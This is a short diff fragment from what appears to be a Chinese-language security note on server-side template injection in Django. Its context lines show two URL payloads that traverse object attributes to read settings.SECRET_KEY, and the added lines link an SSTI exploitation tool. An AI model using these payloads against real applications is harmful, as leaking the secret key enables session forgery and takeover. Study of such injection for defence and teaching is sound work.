@@ -188,7 +188,9 @@ http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.se
 http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}
 ~~~
 
+## SSTI利用工具
 
+https://github.com/epinna/tplmap
 
 > 参考资料
 > https://blog.csdn.net/ssliudh1226/article/details/53420565
